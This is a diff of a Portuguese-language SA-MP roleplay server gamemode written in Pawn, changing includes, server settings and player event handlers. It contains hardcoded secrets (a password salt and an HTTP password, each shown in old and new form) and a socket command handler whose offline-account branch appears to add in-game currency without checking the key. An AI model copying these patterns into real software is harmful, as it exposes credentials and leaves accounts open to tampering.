@@ -1,7 +1,9 @@
 /*
- Este gamemode foi criado por bruxo (http://forum.sa-mp.com/member.php?u=181815)
- Vocé não tem o direito de remover os créditos deste gamemode. Respeite os direitos de autor.
- 
+	Este gamemode foi criado por bruxo (http://forum.sa-mp.com/member.php?u=181815)
+ 	Vocé não tem o direito de remover os créditos deste gamemode. Respeite os direitos de autor.
+
+ 	http://www.messletters.com/pt/big-text/
+
 -------------------------- DOENÇAS --------------------------
 
 1: Gripe
@@ -50,27 +52,28 @@ vida bugada -> meter no UpdateJogador para ver a vida
 */
 
 #include 			<a_samp>
-#include        	<mSelection>
+#include            <timerfix>
+#include            <Pawn.CMD>
+#include			<dini2>
 #include        	<streamer>
 #include 			<nex-ac>
-#include			<DOF2>
 #include        	<sscanf2>
 #include 			<losgs>
 #include        	<gmenus>
-#include 			<zcmd>
 #include            <crashdetect>
 #include 			<YSI\y_iterate>
 #include            <strlib>
 #include            <socket>
+#include        	<mSelection>
 
-#define     		HOSTNAME    			"Paradise City Roleplay v1.0 [PortugalFunMaps.pt]"
+#define     		HOSTNAME    			"Paradise City Roleplay [unknown.pt]"
 #define     		MAPNAME     			"Los Santos"
 #define     		GAMEMODENAME    		"PC-RP 1.0.0"
-#define     		WEBSITE         		"portugalfunmaps.pt"
+#define     		WEBSITE         		"unknown.pt"
 #define     		LANGUAGE        		"Português"
 
-#define             PW_SALT                 "asXedqA!sdRR:_1"
-#define             HTTP_PASSWORD           "aslj33cxz_@asd"
+#define             PW_SALT                 "pirukamcboy"
+#define             HTTP_PASSWORD           "dillazfanboy"
 
 #define         	LOG_MONEY           	"PCRP/Logs/Money.log"
 #define         	LOG_JOIN            	"PCRP/Logs/Join.log"
@@ -154,6 +157,7 @@ vida bugada -> meter no UpdateJogador para ver a vida
 #define             DIALOG_BANCO_MENU_F     69
 #define             DIALOG_BANCO_TEL   		70
 #define             DIALOG_INFOLOJA   		71
+#define             DIALOG_KICK   			72
 #define             DIALOG_TUNNING          250
 
 #define         	PRECO_COMIDA        	80
@@ -209,7 +213,7 @@ vida bugada -> meter no UpdateJogador para ver a vida
 #define         	COLOR_ADMIN         	0xE68D45AA
 #define         	COLOR_HADMIN        	0x00FFFBAA
 #define         	COLOR_OWNER	        	0x00FF00AA
-#define         	COLOR_ERRO	        	0xFF0000AA 
+#define         	COLOR_ERRO	        	0xFF0000AA
 #define         	COLOR_ACTION        	0xD65FE3AA
 #define         	COLOR_CHATIC        	0xACB1C2AA
 #define         	COLOR_BUSINESS      	0x0800FFAA
@@ -240,17 +244,21 @@ vida bugada -> meter no UpdateJogador para ver a vida
 #define         	MSG_NOCAR    			"{FF4000}[ERRO:] {FFFFFF}Não estás em nenhum carro"
 #define         	MSG_NOMONEY         	"{FF4000}[ERRO:] {FFFFFF}Não tens dinheiro suficiente"
 
-#define     		MAX_SLOTS               65
-#define         	MAX_CARROS              300
+#define     		MAX_SLOTS               10
+#define         	MAX_CARROS              100
 #define         	MAX_CASAS           	150
 #define         	MAX_CIDADES         	1
 #define         	MAX_JOBS            	15
-#define         	MAX_BUSINESS        	80
+#define         	MAX_BUSINESS            40
 #define         	MAX_FACTIONS        	10
 #define             MAX_BARREIRAS           30
 #define             MAX_BUILDINGS           10
 
 #define             SLOTSRESERVADOS         5
+
+#define             HEALTH_SET              0
+#define             HEALTH_ADD              1
+#define             HEALTH_REMOVE           2
 
 #define         	BTYPE_RESTAURANTE   	1
 #define         	BTYPE_BAR           	2
@@ -299,6 +307,9 @@ vida bugada -> meter no UpdateJogador para ver a vida
 #define             CHAT_TYPE_GRITAR        3
 #define             CHAT_TYPE_SUSSURRAR     4
 
+#define             TIMER_INFINITO          -1
+#define             TIMER_NODELAY           0
+
 #pragma 			unused 					Numer
 #pragma 			unused 					Number
 #pragma 			unused 					Numbber
@@ -338,8 +349,9 @@ forward WalkieTalkieMessage(playerid, msg[], freq);
 forward HangupTimer(playerid);
 forward UpdateMySQLInfo();
 forward JogadorPuxaJogador(playerid, giveplayerid);
+forward AnimMorteAtualizar(playerid);
 
-forward SetPlayerPosEx(playerid, Float:x, Float:y, Float:z);
+forward SetPlayerPosEx(playerid, Float:x, Float:y, Float:z, vw, interior);
 forward SetVehiclePosEx(vehicleid, Float:x, Float:y, Float:z);
 forward SetPlayerHealthEx(playerid, Float:vida, type);
 forward SetPlayerArmourEx(playerid, Float:colete, type);
@@ -347,7 +359,8 @@ forward SetPlayerArmourEx(playerid, Float:colete, type);
 forward LigarMotor(playerid);
 forward DesligarMotorTodos();
 forward PayDay(playerid);
-forward ShowStats(playerid, target, admincheck);
+forward ShowStats(playerid, target);
+forward ShowStatsAdmin(playerid, target);
 forward DrugEffect(playerid);
 forward DesligarMotores();
 forward AtualizarCaravanaPos(vehicleid);
@@ -356,6 +369,7 @@ forward AtualizarDanosCarro(vehicleid);
 forward Pescar(playerid);
 forward Pescar2(playerid, peixeid);
 forward PodePescar(playerid);
+forward VelocidadeCarta(playerid);
 
 forward KickT(playerid);
 forward BanT(playerid);
@@ -427,7 +441,7 @@ forward HackLog(playerid, str[]);
 forward BanLog(playerid, kickedby[MAX_PLAYER_NAME], str[]);
 forward KickLog(playerid, kickedby[MAX_PLAYER_NAME], str[]);
 forward CMDLog(playerid, cmd[]);
-forward ChatLog(playerid, msg[]);
+forward ChatLog(playerid, msg[], bool:ooc);
 forward ErrorLog(error[]);
 forward SocketLog(msg[]);
 
@@ -641,7 +655,7 @@ enum PlayerInfo
 	Faction,
 	FactionRank,
 	AJCounter,
-	RegDay[8],
+	RegDay[32],
 	Origem,
 	Sexo,
 	Idade,
@@ -717,11 +731,13 @@ enum PlayerInfo
 	Float:SpawnX,
 	Float:SpawnY,
 	Float:SpawnZ,
+	Crashou,
 	SpawnVirtualWorld,
 	SpawnInterior,
 	Suspeito,
 	VezesSuspeito,
 	VezesPreso,
+	Kicks,
 };
 new pInfo[MAX_SLOTS][PlayerInfo];
 new TimerGuardarJogador[MAX_SLOTS] = -1;
@@ -731,6 +747,7 @@ new TimerUpdateJogador[MAX_SLOTS];
 new TimerUnlockTutorial[MAX_SLOTS];
 new TimerPuxarJogador[MAX_SLOTS];
 new TimerVelocimetro[MAX_SLOTS];
+new TimerVelocidadeCarta[MAX_SLOTS];
 new CounterVelocimetro[MAX_SLOTS];
 new CounterKilometros[MAX_SLOTS];
 new Segundos[MAX_SLOTS];
@@ -895,19 +912,15 @@ enum jobInfo
 	Barco,
 };
 new jInfo[MAX_JOBS][jobInfo];
-new RotaJob1[MAX_SLOTS]; // 
+new RotaJob1[MAX_SLOTS]; //
 new RotaJob2[MAX_SLOTS]; //
-new RotaJob3[MAX_SLOTS]; // 
-new RotaJob4[MAX_SLOTS]; // 
-new RotaJob5[MAX_SLOTS]; // 
+new RotaJob3[MAX_SLOTS]; //
+new RotaJob4[MAX_SLOTS]; //
+new RotaJob5[MAX_SLOTS]; //
 new RotaJob6[MAX_SLOTS]; //
-new RotaJob7[MAX_SLOTS]; // 
-new RotaJob8[MAX_SLOTS]; // 
-new RotaJob9[MAX_SLOTS]; // 
-/*new RotaJob10[MAX_SLOTS];
-new RotaJob11[MAX_SLOTS];
-new RotaJob12[MAX_SLOTS];
-new RotaJob13[MAX_SLOTS]; */
+new RotaJob7[MAX_SLOTS]; //
+new RotaJob8[MAX_SLOTS]; //
+new RotaJob9[MAX_SLOTS]; //
 
 new RotaConducao[MAX_SLOTS];
 
@@ -1040,7 +1053,7 @@ enum HouseInfo
 	GaragemLocked,
 };
 new hInfo[MAX_CASAS][HouseInfo];
-new Text3D:HouseLabel[MAX_CASAS]; 
+new Text3D:HouseLabel[MAX_CASAS];
 new HousePickup[MAX_CASAS];
 new Text3D:GaragemLabel[MAX_CASAS];
 new GaragemPickup[MAX_CASAS];
@@ -1082,7 +1095,6 @@ new Text3D:BizLabel[MAX_BUSINESS];
 new BizPickup[MAX_BUSINESS];
 new BizActor[MAX_BUSINESS];
 new Text3D:ActorLabel[MAX_BUSINESS];
-new bool:ActorFirstTime[MAX_BUSINESS];
 
 enum ServerStats
 {
@@ -1589,21 +1601,27 @@ public OnGameModeInit()
 	new tick2;
 
 	tick1 = GetTickCount();
-	
+
     AntiDeAMX();
-    
-    printf("\n A carregar Paradise City Roleplay\n");
-    
+
+	printf("\n\n\n\n ########   ######          ########  ########");
+	printf(" ##     ## ##    ##         ##     ## ##     ##");
+	printf(" ##     ## ##               ##     ## ##     ##");
+	printf(" ########  ##       ####### ########  ########");
+	printf(" ##        ##               ##   ##   ##");
+	printf(" ##        ##    ##         ##    ##  ##");
+	printf(" ##         ######          ##     ## ##        \n");
+
 	g_Socket = socket_create(TCP);
-	
+
 	if(is_socket_valid(g_Socket))
 	{
 		socket_set_max_connections(g_Socket, 10);
 		socket_listen(g_Socket, 59847);
 	}
-    
+
 	new rconcmd[128];
-	
+
 	format(rconcmd, sizeof(rconcmd), "hostname %s", HOSTNAME);
 	SendRconCommand(rconcmd);
 	format(rconcmd, sizeof(rconcmd), "mapname %s", MAPNAME);
@@ -1615,22 +1633,16 @@ public OnGameModeInit()
 	format(rconcmd, sizeof(rconcmd), "gamemodetext %s", GAMEMODENAME);
 	SendRconCommand(rconcmd);
 	SendRconCommand("ackslimit 6000");
-	
+
 	SetWeather(1);
     CarregarServidor();
-	
-	SetTimer("GuardarServidor", 1800000, true); // 30 min
-	SetTimer("AtualizarTodasCaravanasPos", 500, true); // 1/2 sec
-	SetTimer("Relogio", 1000, true);
-	SetTimer("NaoExplode", 2000, true);
-	//SetTimer("UpdateMySQLInfo", 1800000, true); // 30 min
-	
+
 	tick2 = GetTickCount();
-	
+
 	currentSlots = SLOTSRESERVADOS;
 
-	printf("\n\n Paradise City Roleplay carregado com sucesso (%d ms)\n\n\n", tick2-tick1);
-	
+	printf("\n PARADISE CITY ROLEPLAY CARREGADO COM SUCESSO (%d ms)\n\n\n", tick2-tick1);
+
 	return 1;
 }
 
@@ -1639,7 +1651,7 @@ public NaoExplode()
     for(new c = 0; c < MAX_CARROS; c++)
     {
         if(Motor[c] == true) continue;
-        
+
 		new Float:cVida;
 		GetVehicleHealth(c, cVida);
 
@@ -1655,7 +1667,7 @@ public NaoExplode()
 public HttpInfo(index, response_code, data[])
 {
 	new string[64];
-	
+
     if(response_code == 200)
     {
         if(strfind(data, "Undefined index", true) != -1 || strfind(data, "Error", true) != -1)
@@ -1668,7 +1680,7 @@ public HttpInfo(index, response_code, data[])
         format(string, sizeof(string), "HTTP ERROR on sendinfo.php (Error:%d)", response_code);
         ErrorLog(string);
     }
-    
+
 	return 1;
 }
 
@@ -1677,10 +1689,10 @@ public UpdateMySQLInfo()
 	new currentTimestamp = gettime();
 	new onlinePlayers = GetOnlinePlayers();
 	new adminsOnline = 0;
-	
+
 	new vipsOnline = 0;
 	new ajOnline = 0;
-	
+
 	new policiaOnline = 0;
 	new medicoOnline = 0;
 	new mecOnline = 0;
@@ -1689,15 +1701,15 @@ public UpdateMySQLInfo()
 	new drogasOnline = 0;
 	new mafiaOnline = 0;
 	new srOnline = 0;
-	
+
 	new string[256];
-	
+
  	foreach(new i : Player)
     {
 		if(pInfo[i][Admin] > 0) adminsOnline++;
 		if(pInfo[i][Golds] > 0) vipsOnline++;
 		if(pInfo[i][Jailed] == 1) ajOnline++;
-		
+
 		if(pInfo[i][Faction] != 0)
 		{
 		    switch(fInfo[pInfo[i][Faction]][Type])
@@ -1713,7 +1725,7 @@ public UpdateMySQLInfo()
 		    }
 		}
     }
-    
+
     format(string, sizeof(string),"tools.portugalfunmaps.pt/gta/PCRP/sendinfo.php?pw=%s&\
 	timestamp=%d&\
 	onlineplayers=%d&\
@@ -1728,9 +1740,9 @@ public UpdateMySQLInfo()
 	drogasonline=%d&\
 	mafiaonline=%d&\
 	sronline=%d", HTTP_PASSWORD, currentTimestamp, onlinePlayers, adminsOnline, vipsOnline, ajOnline, policiaOnline, medicoOnline, mecOnline, newsOnline, govOnline, drogasOnline, mafiaOnline, srOnline);
-    
+
     HTTP(0, HTTP_GET, string, "", "HttpInfo");
-	
+
 	return 1;
 }
 
@@ -1740,23 +1752,21 @@ public OnGameModeExit()
     {
         GuardarJogador(i);
     }
-    
+
    	if(is_socket_valid(g_Socket))
    	{
    	    socket_destroy(g_Socket);
    	}
-    
-    DOF2_Exit();
-    
+
     printf("\nA desligar Paradise City Roleplay...");
-    
+
     return 1;
 }
 
 public OnIncomingConnection(playerid, ip_address[], port)
 {
     IncomingLog(playerid, ip_address, port);
-    
+
     return 1;
 }
 
@@ -1768,7 +1778,7 @@ public OnPlayerConnect(playerid)
 	{
 		EnableAntiCheatForPlayer(playerid, i, 0);
 	}
-	
+
     RemoveBuildingForPlayer(playerid, 6400, 488.2813, -1734.6953, 12.3906, 0.25); // pay n spray praia
 
 	RemoveBuildingForPlayer(playerid, 4009, 1421.3750, -1477.6016, 42.2031, 0.25);
@@ -2267,46 +2277,35 @@ public OnPlayerConnect(playerid)
 	RemoveBuildingForPlayer(playerid, 1215, 305.6719, -1624.8359, 32.8828, 0.25);
 	RemoveBuildingForPlayer(playerid, 1215, 309.4375, -1613.0781, 32.7891, 0.25);
 
-	SetPlayerPos(playerid, 1000, 1000, 1000);
-	SetPlayerInterior(playerid, 10);
-	
     Logged[playerid] = false;
-    
+
 	JoinLog(playerid);
-	
+
 	new name[MAX_PLAYER_NAME];
 	GetPlayerName(playerid, name, sizeof(name));
-	
+
 	if(TemSlotReservado(playerid) == 1) currentSlots--;
-	
-	if(!IsRPName(name)) return KickPlayer(playerid, "Doge", "Nome Non-RP. Exemplo: Nuno_Costa");
+
+	if(!IsRPName(name)) return KickPlayer(playerid, "Doge", "Nome Non-RP. Exemplo de um nome Roleplay: Nuno_Costa");
 	if(GetOnlinePlayers() >= (MAX_PLAYERS - currentSlots) && TemSlotReservado(playerid) == 0) return KickPlayer(playerid, "Doge", "Esse slot está reservado");
 
-	PlayAudioStreamForPlayer(playerid, "https://cld.pt/dl/download/629656f3-dc8e-4c21-a1ee-928cb5bad2aa/pcrp.mp3");
+	//PlayAudioStreamForPlayer(playerid, "https://cld.pt/dl/download/629656f3-dc8e-4c21-a1ee-928cb5bad2aa/pcrp.mp3");
 
 	CarregarPlayerTextDraws(playerid);
  	CarregarMapasRemove(playerid);
  	TogglePlayerAllDynamicAreas(playerid, true);
-     
+
+ 	new string[128];
+ 	format(string, sizeof(string), "%s {7E7E7E}(ID:%d) {FFFFFF}conectou-se ao servidor.", GetPlayerNameEx(playerid), playerid);
+ 	SendClientMessageToAll(0x3399FFAA, string);
+
 	return 1;
 }
 
 public OnPlayerDisconnect(playerid, reason)
 {
     if(TemSlotReservado(playerid) == 1) currentSlots++;
-    
-	new Float:x, Float:y, Float:z, VW, Int;
 
-	GetPlayerPos(playerid, x, y, z);
-	VW = GetPlayerVirtualWorld(playerid);
-	Int = GetPlayerInterior(playerid);
-
-	pInfo[playerid][SpawnX] = x;
-	pInfo[playerid][SpawnY] = y;
-	pInfo[playerid][SpawnZ] = z;
-	pInfo[playerid][SpawnVirtualWorld] = VW;
-	pInfo[playerid][SpawnInterior] = Int;
-    
 	if(Logged[playerid] == true)
 	{
 		GuardarJogador(playerid);
@@ -2315,29 +2314,58 @@ public OnPlayerDisconnect(playerid, reason)
 	{
 	    KillTimer(TimerPuxarJogador[PuxadorID[playerid]]);
 	}
-	
- 	KillTimer(TimerPuxarJogador[playerid]);
-	
-	KillTimer(TimerUpdateJogador[playerid]);
-	KillTimer(TimerGuardarJogador[playerid]);
-	KillTimer(TimerDroga[playerid]);
-	KillTimer(TimerDrunk[playerid]);
-	
+
+ 	//KillTimer(TimerPuxarJogador[playerid]);
+	//KillTimer(TimerUpdateJogador[playerid]);
+	//KillTimer(TimerGuardarJogador[playerid]);
+	//KillTimer(TimerDroga[playerid]);
+	//KillTimer(TimerDrunk[playerid]);
+
 	Delete3DTextLabel(UIDLabel[playerid]);
-	
+	CleanChat(playerid);
+
+	new string[128];
+
+	switch(reason)
+	{
+	    case 0:
+		{
+			format(string, sizeof(string), "%s {7E7E7E}(ID:%d) {FFFFFF}abandonou o servidor. (Timeout/Crash)", GetPlayerNameEx(playerid), playerid);
+			SendClientMessageToAll(0x3399FFAA, string);
+
+			new Float:x, Float:y, Float:z, VW, Int;
+
+			GetPlayerPos(playerid, x, y, z);
+			VW = GetPlayerVirtualWorld(playerid);
+			Int = GetPlayerInterior(playerid);
+
+			pInfo[playerid][SpawnX] = x;
+			pInfo[playerid][SpawnY] = y;
+			pInfo[playerid][SpawnZ] = z;
+			pInfo[playerid][SpawnVirtualWorld] = VW;
+			pInfo[playerid][SpawnInterior] = Int;
+			pInfo[playerid][Crashou] = 1;
+		}
+	    case 1:
+		{
+			format(string, sizeof(string), "%s {7E7E7E}(ID:%d) {FFFFFF}abandonou o servidor.", GetPlayerNameEx(playerid), playerid);
+			SendClientMessageToAll(0x3399FFAA, string);
+		}
+	}
+
 	return 1;
 }
 
 public OnPlayerRequestClass(playerid, classid)
 {
     TextDrawShowForPlayer(playerid, TDEditor_TD[0]);
-    
-    SetTimerEx("Intro1", 1000, false, "i", playerid);
-    
+
+    //SetTimerEx("Intro1", 1000, false, "i", playerid);
+
     TogglePlayerSpectating(playerid, true);
-    
-    CleanChat(playerid);
+
     ResetStats(playerid);
+    IntroEnd(playerid);
 
     return 1;
 }
@@ -2347,7 +2375,7 @@ public Intro1(playerid)
     TextDrawShowForPlayer(playerid, TDEditor_TD[6]); // wlp apresenta
 
     SetTimerEx("Intro2", 1500, false, "i", playerid);
-    
+
 	return 1;
 }
 
@@ -2356,7 +2384,7 @@ public Intro2(playerid)
     TextDrawShowForPlayer(playerid, TDEditor_TD[3]); // linha
 
     SetTimerEx("Intro3", 800, false, "i", playerid);
-    
+
 	return 1;
 }
 
@@ -2420,87 +2448,64 @@ public IntroEnd(playerid)
 
 public OnPlayerSpawn(playerid)
 {
+	PreloadAnimLib(playerid, "BOMBER");
+	PreloadAnimLib(playerid, "RAPPING");
+	PreloadAnimLib(playerid, "SHOP");
+	PreloadAnimLib(playerid, "BEACH");
+	PreloadAnimLib(playerid, "SMOKING");
+	PreloadAnimLib(playerid, "FOOD");
+	PreloadAnimLib(playerid, "ON_LOOKERS");
+	PreloadAnimLib(playerid, "DEALER");
+	PreloadAnimLib(playerid, "CRACK");
+	PreloadAnimLib(playerid, "CARRY");
+	PreloadAnimLib(playerid, "COP_AMBIENT");
+	PreloadAnimLib(playerid, "PARK");
+	PreloadAnimLib(playerid, "INT_HOUSE");
+	PreloadAnimLib(playerid, "FOOD");
+	PreloadAnimLib(playerid, "PED");
+	PreloadAnimLib(playerid, "PARACHUTE");
+	PreloadAnimLib(playerid, "INT_SHOP");
+
 	if(pInfo[playerid][Morto] == 0)
 	{
-	    SetPlayerHealth(playerid, pInfo[playerid][Vida]);
+	    SetPlayerHealthEx(playerid, pInfo[playerid][Vida], HEALTH_SET);
 	}
-	
+
 	if(pInfo[playerid][Jailed] == 1)
 	{
-		SetPlayerInterior(playerid, 0);
-		SetPlayerVirtualWorld(playerid,0);
-		SetPlayerPosEx(playerid, AJx, AJy, AJz);
+		SetPlayerPosEx(playerid, AJx, AJy, AJz, 0, 0);
 
 		SendClientMessage(playerid, COLOR_INFO, "Acaba a tua sentença no Admin Jail");
 	}
 
 	if(pInfo[playerid][Preso] == 1)
 	{
-		SetPlayerInterior(playerid, 0);
-		SetPlayerVirtualWorld(playerid,0);
-		SetPlayerPosEx(playerid, 1583.6875, -1680.5103, 1089.5883);
+		SetPlayerPosEx(playerid, 1583.6875, -1680.5103, 1089.5883, 0, 0);
 
 		SendClientMessage(playerid, COLOR_INFO, "Acaba a tua sentença na esquadra da polícia");
 	}
-    
+
     return 1;
 }
 
 public onSocketRemoteConnect(Socket:id, remote_client[], remote_clientid)
 {
 	new string[128];
-	
+
 	format(string, sizeof(string), "A receber conexão de %s [ID: %d]", remote_client, remote_clientid);
  	SocketLog(string);
-	
+
 	return 1;
 }
 
 public onSocketRemoteDisconnect(Socket:id, remote_clientid)
 {
     new string[128];
-    
+
     format(string, sizeof(string), "O socket [ID: %d] foi desconectado", remote_clientid);
 	SocketLog(string);
-	
+
 	return 1;
-}
-
-stock GetPlayerPeixes(playerid)
-{
-	return pObjects[playerid][Peixe_Corvina] + pObjects[playerid][Peixe_Congro] + pObjects[playerid][Peixe_Robalo] + pObjects[playerid][Peixe_Sargo] + pObjects[playerid][Peixe_Goraz] + pObjects[playerid][Peixe_Cavala] + pObjects[playerid][Peixe_Dourada] + pObjects[playerid][Peixe_Espada];
-}
-
-stock IsInGaragemPSP(playerid)
-{
-	if(IsPlayerInRangeOfPoint(playerid, 100.0, 1572.9967, -1694.6641, 5.2095))
-	{
-		new Float:x, Float:y, Float:z;
-		GetPlayerPos(playerid, x, y, z);
-		
-		if(z < 8) return 1;
-	}
-	
-	return 0;
-}
-
-stock IsBoat(car)
-{
-    new Boat[] = { 472, 473, 493, 484, 430, 453, 452, 454 };
-    for(new i = 0; i < sizeof(Boat); i++)
-    {
-        if(GetVehicleModel(car) == Boat[i]) return 1;
-    }
-    return 0;
-}
-
-stock GetDataParams(rawdata[])
-{
-    new output[4][64];
-    
-    explode(output, rawdata, ":");
-    
-    return output;
 }
 
 public onSocketReceiveData(Socket:id, remote_clientid, data[], data_len)
@@ -2508,17 +2513,17 @@ public onSocketReceiveData(Socket:id, remote_clientid, data[], data_len)
     new string[256], cIP[16], command[64], uid, nomeConta[64], key[64], responseArray[4][64];
 
     get_remote_client_ip(id, remote_clientid, cIP);
-    
+
     format(string, sizeof(string), "O socket %s [ID: %d] enviou: %s", cIP, remote_clientid, data);
     SocketLog(string);
-	
+
 	responseArray = GetDataParams(data);
-    
+
     command = responseArray[0];
     uid = strval(responseArray[1]);
     nomeConta = responseArray[2];
     key = responseArray[3];
-	
+
 	if(!strcmp(command, "NEW_VIP"))
 	{
 		new found = INVALID_PLAYER_ID;
@@ -2526,20 +2531,20 @@ public onSocketReceiveData(Socket:id, remote_clientid, data[], data_len)
 		{
 		    if(pInfo[i][UID] == uid) found = i;
 		}
-		
+
 		if(found != INVALID_PLAYER_ID) // o jogador está a jogar
 		{
 		    if(strfind(trim(pInfo[found][Key]), trim(key), true) != -1) // a key está certa
 		    {
 		        format(string, sizeof(string), "O socket %s [ID: %d] adicionou golds na conta do jogador %s!", cIP, remote_clientid, GetPlayerNameEx(found));
 		        SocketLog(string);
-		        
+
 		        SendClientMessage(found, COLOR_OWNER, "[VIP]: {FFFFFF}Foram adicionados 20 golds à tua conta. Obrigado por nos ajudares ;)");
 		        pInfo[found][Golds] += 20;
-		        
+
 		        sStats[0][VIPs]++;
 		        currentSlots--;
-		        
+
           		socket_sendto_remote_client(id, remote_clientid, "true");
           		socket_close_remote_client(id, remote_clientid);
 		    }
@@ -2547,7 +2552,7 @@ public onSocketReceiveData(Socket:id, remote_clientid, data[], data_len)
 		    {
 		        format(string, sizeof(string), "O socket %s [ID: %d] tentou adicionar golds no jogador %s com a key errada!", cIP, remote_clientid, GetPlayerNameEx(found));
 		        SocketLog(string);
-		        
+
 		        socket_sendto_remote_client(id, remote_clientid, "Access Denied");
 		        socket_close_remote_client(id, remote_clientid);
 		    }
@@ -2557,8 +2562,8 @@ public onSocketReceiveData(Socket:id, remote_clientid, data[], data_len)
 			new ficheiro[128];
 
 			format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", nomeConta);
-			
-			if(!DOF2_FileExists(ficheiro))
+
+			if(!dini_Exists(ficheiro))
 			{
 		        format(string, sizeof(string), "O socket %s [ID: %d] tentou adicionar VIP's num jogador que não existe [%s]!", cIP, remote_clientid, nomeConta);
 		        SocketLog(string);
@@ -2568,19 +2573,17 @@ public onSocketReceiveData(Socket:id, remote_clientid, data[], data_len)
 			}
 			else
 			{
-				new golds = DOF2_GetInt(ficheiro, "Golds");
-				
-				golds += 20;
-			    
-			    DOF2_SetInt(ficheiro, "Golds", golds);
+				new golds = dini_Int(ficheiro, "Golds");
 
-			    DOF2_SaveFile();
-			    
+				golds += 20;
+
+			    dini_IntSet(ficheiro, "Golds", golds);
+
 		        format(string, sizeof(string), "O socket %s [ID: %d] adicionou golds no jogador offline %s!", cIP, remote_clientid, nomeConta);
 		        SocketLog(string);
-		        
+
 		        sStats[0][VIPs]++;
-		        
+
 		        socket_sendto_remote_client(id, remote_clientid, "true");
 		        socket_close_remote_client(id, remote_clientid);
 			}
@@ -2594,7 +2597,7 @@ public onSocketReceiveData(Socket:id, remote_clientid, data[], data_len)
 		socket_sendto_remote_client(id, remote_clientid, "Access Denied");
   		socket_close_remote_client(id, remote_clientid);
 	}
-	
+
 	return 1;
 }
 
@@ -2608,7 +2611,7 @@ public OnPlayerDeath(playerid, killerid, reason)
 		    return 1;
 		}
 	}
-	
+
 	new Float:x, Float:y, Float:z, VW, Int;
 
 	GetPlayerPos(playerid, x, y, z);
@@ -2616,15 +2619,14 @@ public OnPlayerDeath(playerid, killerid, reason)
 	Int = GetPlayerInterior(playerid);
 
 	pInfo[playerid][Morto] = 1;
-
 	pInfo[playerid][MorteX] = x;
 	pInfo[playerid][MorteY] = y;
 	pInfo[playerid][MorteZ] = z;
 	pInfo[playerid][MorteVirtualWorld] = VW;
 	pInfo[playerid][MorteInterior] = Int;
 
-	SetTimerEx("Morte", 3500, false, "i", playerid);
-	
+	SetPlayerTimer(playerid, "Morte", 5000, false);
+
     return 1;
 }
 
@@ -2634,16 +2636,16 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 {
 	new string[256];
  	new sdialog[1200];
- 	
+
 	switch(dialogid)
 	{
 	    case DIALOG_REGISTER:
 	    {
 	        if(!response) return KickPlayer(playerid, "Doge", "Não se quis registar");
-	        
+
 	        new pw[33];
 	        strmid(pw, inputtext, 0, 32);
-	        
+
 	        if(strlen(pw) == 0 || strlen(pw) < 3)
 			{
 		 		format(string, sizeof(string), "{FF9900}[ {FFFFFF}PORTUGAL FUN MAPS {FF9900}]"); strcat(sdialog,string);
@@ -2654,13 +2656,13 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 			}
 
 			RegistarJogador(playerid, pw);
-			
+
 			return ShowPlayerDialog(playerid, DIALOG_SEXO, DIALOG_STYLE_LIST, "ESCOLHE O TEU SEXO", "{FFFFFF}Masculino\nFeminino", "Escolher", "Sair");
 	    }
 	    case DIALOG_LOGIN:
 	    {
 	        if(!response) return KickPlayer(playerid, "Doge", "Não se quis logar");
-	        
+
 	        LogarJogador(playerid, inputtext);
 
 	        return 1;
@@ -2668,7 +2670,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	    case DIALOG_SEXO:
 	    {
 	        if(!response) return KickPlayer(playerid, "Doge", "Não quis escolher o sexo.");
-	        
+
 	        switch(listitem)
 	        {
 				case 0:
@@ -2680,28 +2682,28 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				    pInfo[playerid][Sexo] = 1;
 				}
 	        }
-	        
+
 	        return ShowPlayerDialog(playerid, DIALOG_IDADE, DIALOG_STYLE_INPUT, "ESCREVE A TUA IDADE", "{FFFFFF}Introduz a tua idade abaixo (18-80).", "Escolher", "Sair");
 	    }
 	    case DIALOG_IDADE:
 	    {
 	        if(!response) return KickPlayer(playerid, "Doge", "Não quis escolher a idade.");
-	        
+
 	        if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_IDADE, DIALOG_STYLE_INPUT, "ESCREVE A TUA IDADE", "{FF0000}Idade inválida. {FFFFFF}Introduz a tua idade novamente (18-80).", "Escolher", "Sair");
-	        
+
 			new idade = strval(inputtext);
-			
+
 			if(idade < 18 || idade > 80) return ShowPlayerDialog(playerid, DIALOG_IDADE, DIALOG_STYLE_INPUT, "ESCREVE A TUA IDADE", "{FF0000}Idade inválida. {FFFFFF}Introduz a tua idade novamente (18-80).", "Escolher", "Sair");
-			
+
 			pInfo[playerid][Idade] = idade;
-			
+
 			format(string, sizeof(string), "{FFFFFF}%s", SpawnInfo[0][Nome]);
 			return ShowPlayerDialog(playerid, DIALOG_ORIGEM, DIALOG_STYLE_LIST, "ESCOLHE A TUA NATURALIDADE", string, "Escolher", "Sair");
 	    }
 	    case DIALOG_ORIGEM:
 	    {
 	        if(!response) return KickPlayer(playerid, "Doge", "Não quis escolher a naturalidade.");
-	        
+
 	        switch(listitem)
 	        {
 	            case 0:
@@ -2719,16 +2721,16 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	        }
 
 			format(string, sizeof(string), "{FFFFFF}Este servidor consiste em imitar a vida real ao máximo. Para isso precisas de fazer tudo o que normalmente uma pessoa"); strcat(sdialog,string);
-			format(string, sizeof(string), "\n{FFFFFF}normal faz. Tal como um cidadão normal e com pleno juízo, terés de trabalhar para te sustentares. Tens ao teu alcance várias maneiras de ganhar"); strcat(sdialog,string);
+			format(string, sizeof(string), "\n{FFFFFF}normal faz. Tal como um cidadão normal e com pleno juízo, terás de trabalhar para te sustentares. Tens ao teu alcance várias maneiras de ganhar"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FFFFFF}dinheiro, desde trabalhos até às Factions (legais ou ilegais). Com este dinheiro que futuramente ganharás, poderás adquirir carros, casas,"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FFFFFF}bens materiais, ir a festas e fazer tudo aquilo que te apetecer, respeitando sempre as regras do bom funcionamento do servidor."); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FFFFFF}Mas lembra-te, tudo aquilo que não podes fazer na vida real também não podes fazer dentro do nosso servidor."); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FFFFFF}Este é um pormenor importante do qual te deves sempre lembrar."); strcat(sdialog,string);
-		    
+
